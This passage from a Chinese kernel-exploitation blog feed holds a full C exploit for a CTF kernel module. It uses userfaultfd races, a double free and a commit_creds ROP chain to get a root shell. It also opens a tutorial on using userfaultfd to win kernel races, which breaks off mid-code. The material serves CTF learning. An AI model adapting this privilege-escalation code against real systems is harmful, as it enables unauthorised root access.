class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *seq_fd_reserve[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x57AC0001</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x57AC0002</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">leak_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler unblocked&quot;</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">delete</span> (&amp;kernel_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]leak ptr:%p\n&quot;</span>, kernel_addr);</span><br><span class="line">    kernel_base = kernel_addr - <span class="number">0x186f78</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">double_free_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free handler unblocked&quot;</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">char</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">delete</span> (tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">getroot_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] getroot handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] getroot handler unblocked&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        close(seq_fd_reserve[i]);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    pop_rdi = <span class="number">0xffffffff81034505</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xffffffff81069c10</span> + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81600a34</span> + kernel_offset + <span class="number">0x10</span>;</span><br><span class="line">    prepare_kernel_cred = <span class="number">0xffffffff81069e00</span> + kernel_offset;</span><br><span class="line">    mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff8121f89a</span> + kernel_offset;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   prepare_kernel_cred\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   commit_creds\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] execve root shell now...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] getroot handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/proc/stack&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Error opening /proc/stack\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *leak_buf;</span><br><span class="line">    <span class="keyword">int</span> shm_id;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *shm_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *double_free_buf;</span><br><span class="line">    <span class="keyword">char</span> *getroot_buf;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd_reserve[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            ErrExit(<span class="string">&quot;seq reserve!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leak_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(leak_buf, <span class="number">0x1000</span>, leak_handler);</span><br><span class="line">    shm_id = shmget(<span class="number">114514</span>, <span class="number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;shmget!&quot;</span>);</span><br><span class="line">    shm_addr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_addr &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;shmat!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (shmdt(shm_addr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    create(leak_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]kernel_base=&gt;%p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]kernel_offset=&gt;%p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    double_free_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(double_free_buf, <span class="number">0x1000</span>, double_free_handler);</span><br><span class="line">    create(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> (double_free_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] double free\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    getroot_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(getroot_buf + <span class="number">0x1000</span>, <span class="number">0x1000</span>, getroot_handler);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(getroot_buf + <span class="number">0x1000</span> - <span class="number">8</span>) = <span class="number">0xffffffff814d51c0</span> + kernel_offset;</span><br><span class="line">    <span class="comment">// // add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget=&gt;%p\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(getroot_buf + <span class="number">0x1000</span> - <span class="number">8</span>));</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, getroot_buf + <span class="number">0x1000</span> - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220906195313852.png"                      alt="image-20220906195313852"                ></p><p>题目放在：<a class="link"   href="https://github.com/196082/196082/tree/main/kernel_pwn" >https://github.com/196082/196082/tree/main/kernel_pwn<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：<a class="link"   href="https://www.anquanke.com/post/id/266898#h3-5" >https://www.anquanke.com/post/id/266898#h3-5<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;关于userfaultfd这里就不再提及了，不熟悉的可以看一下上一篇文章 &lt;a href=&quot;https://cv196082.gitee.io/2022/08/16/userfaultfd/&quot;&gt;https://cv196082.gitee.io/2022/08/16/use</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="userfaultfd" scheme="https://cv196082.gitee.io/tags/userfaultfd/"/>
    
    <category term="setxattr" scheme="https://cv196082.gitee.io/tags/setxattr/"/>
    
    <category term="pt_regs" scheme="https://cv196082.gitee.io/tags/pt-regs/"/>
    
  </entry>
  
  <entry>
    <title>userfaultfd利用</title>
    <link href="https://cv196082.gitee.io/2022/08/16/userfaultfd/"/>
    <id>https://cv196082.gitee.io/2022/08/16/userfaultfd/</id>
    <published>2022-08-16T10:11:10.000Z</published>
    <updated>2022-08-16T10:11:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实这应该是kernelpwn基础中的一个，但是一直没有很关心，在最近做一道题目时又提到了这一利用方式，索性就把这玩意给先写了。</p><h3 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h3><p>userfaultfd 并不是一种攻击的名字，它是 Linux 提供的一种让用户自己处理缺页异常的机制，初衷是为了提升开发灵活性，在 kernel pwn 中常被用于提高条件竞争的成功率。比如在如下的操作时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(kptr, user_buf, size);</span><br></pre></td></tr></table></figure><p>如果在进入函数后，实际拷贝开始前线程被中断换下 CPU，别的线程执行，修改了 kptr 指向的内存块的所有权（比如 kfree 掉了这个内存块），然后再执行拷贝时就可以实现 UAF。这种可能性当然是比较小的，但是如果 user_buf 是一个 mmap 的内存块，并且我们为它注册了 userfaultfd，那么在拷贝时出现缺页异常后此线程会先执行我们注册的处理函数，在处理函数结束前线程一直被暂停，结束后才会执行后面的操作，大大增加了竞争的成功率。</p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="页调度与延迟加载"><a href="#页调度与延迟加载" class="headerlink" title="页调度与延迟加载"></a>页调度与延迟加载</h3><p>有的内存既不在RAM也不在交换区，例如mmap创建的内存映射页。mmap页在read/write访问之前，实际上还没有创建（还没有映射到实际的物理页），例如：<code>mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);</code> 内核并未将fd内容拷贝到0x1337000，只是将地址0x1337000映射到文件fd。</p><p>当有如下代码访问时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)<span class="number">0x1337000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content: %c\n&quot;</span>, a[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>若发生对该页的引用，则（1）为0x1337000创建物理帧，（2）从fd读内容到0x1337000，（3）并在页表标记合适的入口，以便识别0x1337000虚地址。如果是堆空间映射，仅第2步不同，只需将对应物理帧清0。</p><p>总之，若首次访问mmap创建的页，会耗时很长，会导致上下文切换和当前线程的睡眠。</p><h2 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>我对于他的理解就是，userfaultfd机制是用来处理页缺陷的，并且处理的handle函数我们也是可以控制的。正常的流程一般为下面几步。</p><h3 id="Step-1-创建一个描述符uffd"><a href="#Step-1-创建一个描述符uffd" class="headerlink" title="Step 1: 创建一个描述符uffd"></a>Step 1: 创建一个描述符uffd</h3><p>所有的注册内存区间、配置和最终的缺页处理等就都需要用ioctl来对这个uffd操作。ioctl-userfaultfd支持UFFDIO_API、UFFDIO_REGISTER、UFFDIO_UNREGISTER、UFFDIO_COPY、UFFDIO_ZEROPAGE、UFFDIO_WAKE等选项。比如UFFDIO_REGISTER用来向userfaultfd机制注册一个监视区域，这个区域发生缺页时，需要用UFFDIO_COPY来向缺页的地址拷贝自定义数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">2</span> 个用于注册、注销的ioctl选项：</span><br><span class="line">UFFDIO_REGISTER                 注册将触发user-fault的内存地址</span><br><span class="line">UFFDIO_UNREGISTER               注销将触发user-fault的内存地址</span><br><span class="line"># <span class="number">3</span> 个用于处理user-fault事件的ioctl选项：</span><br><span class="line">UFFDIO_COPY                     用已知数据填充user-fault页</span><br><span class="line">UFFDIO_ZEROPAGE                 将user-fault页填零</span><br><span class="line">UFFDIO_WAKE                     用于配合上面两项中 UFFDIO_COPY_MODE_DONTWAKE 和</span><br><span class="line">                                UFFDIO_ZEROPAGE_MODE_DONTWAKE模式实现批量填充  </span><br><span class="line"># <span class="number">1</span> 个用于配置uffd特殊用途的ioctl选项：</span><br><span class="line">UFFDIO_API                      它又包括如下feature可以配置：</span><br><span class="line">                                UFFD_FEATURE_EVENT_FORK         (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_EVENT_REMAP        (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_EVENT_REMOVE       (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_EVENT_UNMAP        (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_MISSING_HUGETLBFS  (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_MISSING_SHMEM      (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_SIGBUS             (since Linux <span class="number">4.14</span>)</span><br><span class="line"><span class="comment">// userfaultfd系统调用创建并返回一个uffd，类似一个文件的fd</span></span><br><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br></pre></td></tr></table></figure><h3 id="STEP-2-用ioctl的UFFDIO-REGISTER选项注册监视区域"><a href="#STEP-2-用ioctl的UFFDIO-REGISTER选项注册监视区域" class="headerlink" title="STEP 2. 用ioctl的UFFDIO_REGISTER选项注册监视区域"></a>STEP 2. 用ioctl的UFFDIO_REGISTER选项注册监视区域</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 